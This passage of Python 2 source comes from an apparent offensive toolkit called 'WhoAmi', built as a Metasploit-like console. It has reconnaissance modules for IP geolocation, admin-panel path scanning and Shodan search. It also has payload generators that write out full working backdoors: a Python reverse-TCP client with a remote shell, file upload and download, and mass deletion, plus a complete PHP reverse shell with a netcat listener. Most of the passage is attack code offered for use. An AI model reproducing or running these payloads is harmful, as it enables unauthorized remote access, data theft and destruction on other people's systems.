    os.system(amerr)
   
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    continue_in_secrecy_client_1()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  continue_in_secrecy_client_1()
  
 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    continue_in_secrecy_client_1()   
#kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk{communication}kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk


######################################################################{auxiliary}#############################################################
ip = ["192.168.1.1"]
def ip_number_information():
 try:
  amerr = str(raw_input(default+'WhoAmi auxiliary('+red+'ip_number_information'+default+') > '))
  if  amerr[:10] == "set target" or  amerr[:10] == "set TARGET" :
     ip[0] = amerr[11:]
     print "TARGET => ", ip[0]
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (ip_number_information):" 
   print ""
   print"        Name      Current Setting      Required      Description"
   print"        TARGET     "+ip[0]+"           yes         ip_target /url_target"
   print ""
   print ""
   ip_number_information()
  
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
   print ''
   time.sleep(0.01)
   print light_blue +'[...] Searching for ' + basic_yellow + ip[0] 
   print ''
   request = requests.get('http://ip-api.com/json/'+ip[0])
   data = request.json()
   print green + 'Advanced Information'
   print basic_green + 'Lat           :      ' + white + str(data['lat']) 
   print basic_green + 'Lon           :      ' + white + str(data['lon']) 
   print basic_green + 'Coord         :      ' + white + str(data['lat']) + ',' + str(data['lon'])
   print basic_green + 'Google Maps   :      ' + white + 'https://www.google.com.br/maps/place/' + str(data['lat']) + ',' + str(data['lon']) 
   print ''
   print green + 'Basic Information'
   print basic_green + 'Country       :      ' + white + data['country'] + '[' + data['countryCode'] + ']' 
   print basic_green + 'City          :      ' + white + data['city'] + ' - ' + data['region'] + ' - {' + data['regionName'] + '}'  
   print basic_green + 'Timezone      :      ' + white + data['timezone'] 
   print basic_green + 'Zip           :      ' + white + data['zip'] 
   print ''
   print green + 'Internet Information'
   print basic_green + 'ISP           :      ' + white + data['isp'] 
   print basic_green + 'Org           :      ' + white + data['as'] 
   print ''
   time.sleep(2)
   print basic_yellow + '[*] Done '
   print ''

  elif amerr[:4] == 'help':
   help_help()
   ip_number_information()
  
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)

   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:6] == "banner":
    banner()
    ip_number_information()
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    ip_number_information()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  ip_number_information()
 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    ip_number_information()


linkk = ["example.com"]
def admin_panel_findler():
 try:
  amerr = str(raw_input(default+'WhoAmi auxiliary('+red+'admin_panel_findler'+default+') > '))
  if  amerr[:8] == "set link" or  amerr[:8] == "set LINK" :
   linkk[0] = amerr[9:]
   print "LINK => ", linkk[0]
   admin_panel_findler()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (admin_panel_findler):" 
   print ""
   print"        Name      Current Setting      Required      Description"
   print"        LINK      "+linkk[0]+"          yes           link web target "
   print ""
   print ""
   admin_panel_findler()
  elif amerr[:3] == "run" or amerr[:7] == "exploit":   
    f = open("core/link.txt","r");
    link = linkk[0]
    print blue+"[*]"+default+"starting the scanning"
    print "\n\nAvilable links : \n"
    while True:
      sub_link = f.readline()
      if not sub_link:
         break
      req_link = "http://"+link+"/"+sub_link
      req = Request(req_link)
      try:
         response = urlopen(req)
      except HTTPError as e:
        continue
      except URLError as e:
        continue
      else:
        print "OK => ",req_link
    admin_panel_findler()       

  elif amerr[:4] == 'help':
   help_help()
   admin_panel_findler()
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:6] == "banner":
    banner()
    admin_panel_findler() 
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    admin_panel_findler()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  admin_panel_findler()

 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    admin_panel_findler()
    
    
    
Apikey = ['bFWNo4jE90.....']
Search   = ['webcam']
def gather_shodan_search():
 try:
  amerr = str(raw_input(default+'WhoAmi auxiliary('+red+'gather_shodan_search'+default+') > '))
  
  if  amerr[:10] == "set apikey" or  amerr[:10] == "set APIKEY" :
     Apikey[0] = amerr[11:]
     print "APIKEY => ", Apikey[0]
     gather_shodan_search()
     
  elif  amerr[:10] == "set search" or  amerr[:10] == "set SEARCH" :
     Search[0] = amerr[11:]
     print "SEARCH => ", Search[0]
     gather_shodan_search()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (gather_shodan_search):" 
   print ""
   print"        Name      Current Setting      Required      Description"
   print"        APIKEY    "+str(Apikey[0])+"      yes           The SHODAN API key"
   print"        SEARCH    "+str(Search[0])+"               yes           Keywords you want to search for"
   print ""
   print ""
   gather_shodan_search()
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
    def shodan_search(search, apikey):

     if apikey:
        API_KEY = apikey
     else:
        API_KEY = red+'[-]'+default+'REPLACE WITH API KEY AND KEEP QUOTES'

     api = shodan.Shodan(API_KEY)
     ips_and_ports = []

    # Get IPs from Shodan search results
     try:
        results = api.search(search, page=1)
        total_results = results['total']
        print blue+'[*]'+default+'Total results: {0}'.format(total_results)
        print blue+'[*]'+default+'First page:'
        for r in results['matches']:
            ip = r['ip_str']
            port = r['port']
            ip_port = '{0}:{1}'.format(ip, port)
            print green+' [+]'+default, ip_port

     except Exception as e:
        print red+'[-]'+default+'Shodan search error:', e
    search = str(Search[0])
    apikey = str(Apikey[0])
    shodan_search(search, apikey)
    gather_shodan_search()

  elif amerr[:4] == 'help':
   help_help()
   gather_shodan_search()
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)

   elif amerr[:6] == "banner":
    banner()
    gather_shodan_search()
 
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    gather_shodan_search()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  gather_shodan_search()

 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    gather_shodan_search()
######################################################################{end auxiliary}######################################################################



#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$${payloads}$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
lhost = ["192.168.1.1"]
lport = ["4444"]
lpythonname = ["payload.py"]
def payload_unix_python_reverse_tcp():
 try:
  amerr = str(raw_input(default+'WhoAmi payloads('+red+'payload_unix_python_reverse_tcp'+default+') > '))
  
  if  amerr[:9] == "set lhost" or  amerr[:9] == "set LHOST" :
     lhost[0] = amerr[10:]
     print "LHOST => ", lhost[0]
     payload_unix_python_reverse_tcp()
  elif  amerr[:9] == "set lport" or  amerr[:9] == "set LPORT" :
     lport[0] = amerr[10:]
     print "LPORT => ", lport[0]
     payload_unix_python_reverse_tcp()
  elif  amerr[:9] == "set lname" or  amerr[:9] == "set LNAME" :
     lpythonname[0] = amerr[10:]
     print "LNAME => ", lpythonname[0]
     payload_unix_python_reverse_tcp()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (payload_unix_python_reverse_tcp):" 
   print ""
   print"        Name      Current Setting      Required      Description"
   print"        LHOST     "+lhost[0]+"           yes          The listen address "
   print"        LPORT         "+lport[0]+"              yes          The listen port "
   print"        LNAME     "+lpythonname[0]+"            yes          The name of payload "
   print ""
   print ""
   payload_unix_python_reverse_tcp()
  elif amerr[:8] == "generate" or amerr[:6] == "create":
    print ""
    print blue+"[*]"+default+ "Create a backdour"
    time.sleep(2)
    print ""
    time.sleep(2)
    print ""
    print green_underline+"[*] Done"+default
    time.sleep(2)
    print ""
    f = open(lpythonname[0] , 'w')
    f.write('''

import socket
import subprocess 
import os
try:
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("'''+lhost[0]+'''", '''+lport[0]+'''))
 s.send('the clinet user is {0}'.format(os.getlogin()).encode('utf-8'))
 while True:
  
  whoami = s.recv(500000).decode("utf-8")
  if whoami[:2] == 'cd':
     try:
       os.chdir(whoami[3:])
       dir = os.getcwd()
       s.sendall('Path: ' + dir)
     except:
       s.sendall('[!] The Path Not Found')
       
       
       
       
  elif whoami == 'ip_address':
            results = subprocess.Popen('curl -s https://ip.seeip.org', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
            s.sendall('[*] IP address is: ' + results)
  elif whoami[0:8] == 'makedirs':
            m = whoami[9:]
            if '1' in m or '2' in m or '3' in m or '4' in m or '5' in m or '6' in m or '7' in m or '8' in m or '9' in m or '0' in m:
                a = int(whoami[9:])
                try:
                    for i in range(a):
                        m = str(i)
                        ra = random.random()
                        h = str(ra)
                        os.mkdir('King-Hacking' + h + m)

                    s.sendall('[+] Done Make All Files ...100%')
                except:
                    s.sendall('[-] Error I Can"t Make The Files')

            else:
                s.sendall('[-] Error I Can"t Make The Files')
  elif whoami == 'info_target':
            results = subprocess.Popen('curl -s http://ip-api.com/', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
            s.sendall(''+'[*] Information on Target' + results + '')
  elif whoami == 'scan_port':
            results = subprocess.Popen('ip=$(curl -s https://ip.seeip.org) && curl -s http://api.hackertarget.com/nmap/?q="$ip"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
            s.sendall('[*] Scanner Port ' + results + '')
  elif whoami[:5] == 'mkdir':
            try:
                os.mkdir(cmd[6:])
                s.sendall('Done ...')
            except:
                s.sendall('[!] Error: I Cant Make The File')

  elif whoami[:4] == 'copy':
            a = whoami[5:].split(' ')
            try:
                if not os.path.exists(a[0]):
                    s.sendall('[!] The File `' + a[0] + '` Not Found')
                elif os.path.exists(a[1]):
                    s.sendall('[!] Found Name File `' + a[1] + '` in The Path')
                elif a[1] == '' or a[1] == ' ':
                    s.sendall('[!] Please Enter Path EXM: `copy file /sdcard/file1`')
                else:
                    copyfile(a[0], a[1])
                    s.sendall('[+] Done Copying ...100%')
            except:
                s.sendall('[!] Please Enter Path EXM: `copy file /sdcard/file1`')

  elif whoami[:4] == 'move':
            a = whoami[5:].split(' ')
            try:
                if not os.path.exists(a[0]):
                    s.sendall('[!] The File `' + a[0] + '` Not Found')
                elif os.path.exists(a[1]):
                    s.sendall('[!] Found Name File `' + a[1] + '` in The Path')
                elif a[1] == '' or a[1] == ' ':
                    s.sendall('[!] Please Enter the Path EXM: `move file /root/file1`')
                else:
                    shutil.move(a[0], a[1])
                    s.sendall('[+] Done Moveing ...100%')
            except:
                s.sendall('[!] Please Enter the Path EXM: `move file /root/file1`')

  elif whoami[:6] == 'rename':
            a = whoami[7:].split(' ')
            try:
                if not os.path.exists(a[0]):
                    s.sendall('[!] The File `' + a[0] + '` Not Found')
                elif os.path.exists(a[1]):
                    s.sendall('[!] Found Name File `' + a[1] + '` in The Path')
                elif a[1] == '' or a[1] == ' ':
                    s.sendall('[!] Please Enter Name New EXM: `rename file file1`')
                else:
                    os.rename(a[0], a[1])
                    s.sendall('[+] Done ReName ...100%')
            except:
                s.sendall('[!] I can`t ReName The File')

  elif whoami[:3] == 'cat':
            try:
                if not os.path.exists(whoami[4:]):
                    s.sendall('[!] The File `' + whoami[4:] + '` Not Found')
                else:
                    results = subprocess.Popen(whoami, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    results = results.stdout.read() + results.stderr.read()
                    s.sendall('[*] ' + whoami[4:] + '' + results)
            except:
                s.sendall("[!] I Can't Cat The File")

  elif whoami == 'kernel':
            results = subprocess.Popen('cat /proc/version', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
            s.sendall(results)
  elif whoami == 'delall':
            try:
                os.system('rm -rif *')
                s.sendall('[+] Done Delleted All File ...100%')
            except:
                s.sendall('[!] I can`t Dellet All File')

  elif whoami[:3] == 'del':
            try:
                if not os.path.exists(whoami[4:]):
                    s.sendall('[!] The File Not Found')
                else:
                    os.system('rm -rif ' + whoami[4:])
                    s.sendall('[+] Done Delleting ...100%')
            except:
                s.sendall('[!] I can`t Dellet The File')

  elif whoami == 'pid':
            pid = os.getpid()
            s.sendall(str(pid))
  elif whoami == 'hostname':
            use = socket.gethostname()
            s.sendall(str(use))
  elif 'ls' in whoami[:2]:
            results = subprocess.Popen(whoami, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
            s.sendall('[*] ' + whoami + '' + results)
  elif whoami == 'partitions':
            results = subprocess.Popen('cat /proc/partitions', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
            s.sendall(results)
  elif whoami == 'mem_info':
            results = subprocess.Popen('cat /proc/meminfo', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
            s.sendall(results)
  elif whoami == 'cpu':
            results = subprocess.Popen('cat /proc/cpuinfo', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
            s.sendall(results)
  elif whoami == 'crypto':
            results = subprocess.Popen('cat /proc/crypto', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
            s.sendall(results)
  elif whoami == 'mac_wifi':
            try:
                if os.path.exists('/efs/wifi/.mac.info'):
                    if os.path.exists('ifconfig'):
                        os.system('rm -rif ifconfig')
                    results = subprocess.Popen('cat /efs/wifi/.mac.info', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    results = results.stdout.read() + results.stderr.read()
                    s.sendall('[+] Mac Address: ' + results)
                else:
                    results = subprocess.Popen('ifconfig > ifconfig && ifconfig', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    results = results.stdout.read() + results.stderr.read()
                    if 'wlan0' in results:
                        redd = open('ifconfig', 'r')
                        for line in redd:
                            if 'wlan0' in line.strip('HWaddr'):
                                s.sendall('[+] Mac Address: ' + line[-20:])

                        redd.close()
                        if os.path.exists('ifconfig'):
                            os.system('rm -rif ifconfig')
            except:
                s.sendall('' + '[-] I Can Not get Mac Address' + '')

  elif whoami == 'mac_bluetooth':
            try:
                if os.path.exists('/efs/bluetooth/bt_addr'):
                    results = subprocess.Popen('cat /efs/bluetooth/bt_addr', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    results = results.stdout.read() + results.stderr.read()
                    s.sendall('[+] Mac Address: ' + results)
                else:
                    s.sendall('[-] No Bluetooth on device Target')
            except:
                s.sendall('[-] No Bluetooth on device Target')

  elif whoami == 'net_info':
            results = subprocess.Popen('arp', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
            if results == '':
                s.sendall('[!] info network card: No informations' + '')
            else:
                s.sendall('[*] info network card: ' + results)
  elif whoami[:8] == 'download':
            sendFile = whoami[9:]
            if os.path.isfile(sendFile):
                with open(sendFile, 'rb') as (f):
                    while 1:
                        filedata = f.read()
                        if filedata == None:
                            break
                        s.sendall(filedata)
                        break

                f.close()
                s.sendall('HACKING')
            else:
                s.sendall('HACKING WhoAmi:Amerr')
  elif whoami[0:6] == 'upload':
            downFile = whoami[7:]
            try:
                f = open(downFile, 'wb')
                while True:
                    l = s.recv(102400)
                    while 1:
                        if l.endswith('HACKING'):
                            u = l[:-7]
                            f.write(u)
                            s.sendall('[+] Uploaded File ...100%')
                            break
                        elif l.startswith('HACKING'):
                            s.sendall('[-] The File Not Found')
                            f.close()
                            os.system('rm -rif ' + downFile)
                            break

                    break

                f.close()
            except:
                pass

  else:
     p = subprocess.Popen(whoami, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     p = p.stdout.read() + p.stderr.read()
     s.send(p.encode("utf-8"))
except socket.error as e:
 print(e)

''')
    f.close()
    
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
   os.system("rm -rf service.py")
   g= open("service.py", "w")
   g.write('''
import socket
import os
os.system("rm-rf service.py")
#########{colors}################
basic_green 	=	"\033[0;32m"#
green			=	"\033[1;32m"#
green_underline	=	"\033[4;32m"#
basic_yellow	=	"\033[0;33m"#
yellow 			=	"\033[1;33m"#
white			=	"\033[0;37m"#
whiteb			=	"\033[1;37m"#
basic_red		=	"\033[0;31m"#
red				=	"\033[1;31m"#
cyan			=	"\033[1;36m"#
basic_cyan		=	"\033[0;36m"#
blue			=	"\033[1;34m"#
basic_blue		=	"\033[0;34m"#
light_blue		=	"\033[0;94m"#
blue_underline	=	"\033[4;34m"#
default			=	"\033[0m"   #
underline		=	"\033[4;32m"#
#################################
commend ="""

Core Commands
=============

    Command          Description
    -------          -----------
    ps               : List running processes
    exit             : Exit the console
    help             : Help menu
    clear            : clean all commands


File system Commands
====================

    Command          Description
    -------          -----------
    cd               : Change directory on Target
    lcd              : Change directory on your file
    copy             : Copy source to destination
    ls               : List files on Target
    lls              : List yor file
    move             : Move source to destination
    del              : Delete the specified file
    delall           : Delete All Files in Path
    cat              : Read the contents of a file to the screen
    pwd              : Print working directory
    mkdir            : Make directory
    makedirs         : Make lots of files (ex: makedirs 10)
    rename           : ReName Any File or directory
    del              : Dellet directory
    download         : Download a file or directory
    upload           : Upload a file or directory


System Commands
===============

    Command          Description
    -------          -----------
    pid              : get process id
    cpu              : Show Info CPU Target
    shell            : Drop into a system command shell
    crypto           : Show Encoding On Target
    hostname         : get host name
    use_momery       : Show Use Memory Target
    mem_info         : Show Info Memory Target
    kernel           : Show Kernel Version + Info
    info_phone       : Gets information about the remote system
    localtime        : Displays the target system's local time
    getuid           : Get the user that the server is running as
    partitions       : Check Info Partisi On Target


Networking Commands
===================

    Command          Description
    -------          -----------
    ifconfig         : Display interfaces
    net_info         : check network card & show ip address
    mac_wifi         : Show Mac Address The Wifi Target
    mac_bluetooth    : Show Mac Address The bluetooth Target
    ip_address       : Get IP address Target
    scan_port        : Get Ports open and closeed on Target
    info_target      : Get information about where the target


Android Commands
================

    Command          Description
    -------          -----------
    check_root       : Show info Root Target

 
"""
host = str("'''+lhost[0]+'''")
port = str("'''+lport[0]+'''")
try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("'''+lhost[0]+'''", '''+lport[0]+'''))
        print '--------------------------------------------'
        print blue+'[*]' +yellow+"Started Exploiting on "+host+ ':' +port+ ""+default
        print blue+'[*]' +yellow+'Waiting for the connection...'+default
        print '--------------------------------------------'        
        s.listen(10000)
        client, addr = s.accept()

        print 'concstions from {0}:{1}'.format(addr[0],addr[1])
        print ''
        while True:
              data = client.recv(500000)
              print(data.decode('utf-8'))
              print ""
              whoami = str(raw_input(" { sessions }>> "))
              print ""
              if whoami == "help":
                print commend 
                client.send(whoami.encode("utf-8"))
              else:
               client.send(whoami.encode("utf-8"))
except socket.error as e:
         print(e)
   ''')
   g.close()
   os.system('python2 service.py')
   payload_unix_python_reverse_tcp
  elif amerr[:4] == 'help':
   help_help()
   payload_unix_python_reverse_tcp()
  
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:6] == "banner":
    banner()
    payload_unix_python_reverse_tcp()   
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    payload_unix_python_reverse_tcp()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  payload_unix_python_reverse_tcp()


 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    payload_unix_python_reverse_tcp()


lhost = ["192.168.1.1"]
lport = ["4444"]
lphpname = ["payload.php"]
def payload_unix_php_reverse_tcp():
 try:
  amerr = str(raw_input(default+'WhoAmi payloads('+red+'payload_unix_php_reverse_tcp'+default+') > '))
  
  if  amerr[:9] == "set lhost" or  amerr[:9] == "set LHOST" :
     lhost[0] = amerr[10:]
     print "LHOST => ", lhost[0]
     payload_unix_php_reverse_tcp()
  elif  amerr[:9] == "set lport" or  amerr[:9] == "set LPORT" :
     lport[0] = amerr[10:]
     print "LPORT => ", lport[0]
     payload_unix_php_reverse_tcp()
  elif  amerr[:9] == "set lname" or  amerr[:9] == "set LNAME" :
     lphpname[0] = amerr[10:]
     print "LNAME => ", lphpname[0]
     payload_unix_php_reverse_tcp()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (payload_unix_php_reverse_tcp):" 
   print ""
   print"        Name      Current Setting      Required      Description"
   print"        LHOST     "+lhost[0]+"           yes          The listen address "
   print"        LPORT         "+lport[0]+"              yes          The listen port "
   print"        LNAME     "+lphpname[0]+"           yes          The name of payload "
   print ""
   print ""
   payload_unix_php_reverse_tcp()
  elif amerr[:8] == "generate" or amerr[:6] == "create":
    print ""
    print blue+"[*]"+default+ "Create a backdour"
    time.sleep(2)
    print ""
    time.sleep(2)
    print ""
    print green_underline+"[*] Done"+default
    time.sleep(2)
    print ""
    f = open(lphpname[0] , 'w')
    f.write("""
    
    
<?php


set_time_limit (0);
$VERSION = "1.0";
$ip = '"""+lhost[0]+"""';  // CHANGE THIS
$port = """+lport[0]+""";       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 

        """)
    f.close()
    
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
   os.system("nc -l -p "+str(lport[0])+" -v")
   payload_unix_php_reverse_tcp
  elif amerr[:4] == 'help':
   help_help()
   payload_unix_php_reverse_tcp()
  
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:6] == "banner":
    banner()
    payload_unix_php_reverse_tcp()   
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    payload_unix_php_reverse_tcp()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  payload_unix_php_reverse_tcp()

 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    payload_unix_php_reverse_tcp()
lhost = ["192.168.1.1"]
lport = ["4444"]
lperlname = ["payload.pl"]
def payload_unix_perl_reverse_tcp():
 try: 
  amerr = str(raw_input(default+'WhoAmi payloads('+red+'payload_unix_perl_reverse_tcp'+default+') > '))
  
  if  amerr[:9] == "set lhost" or  amerr[:9] == "set LHOST" :
     lhost[0] = amerr[10:]
     print "LHOST => ", lhost[0]
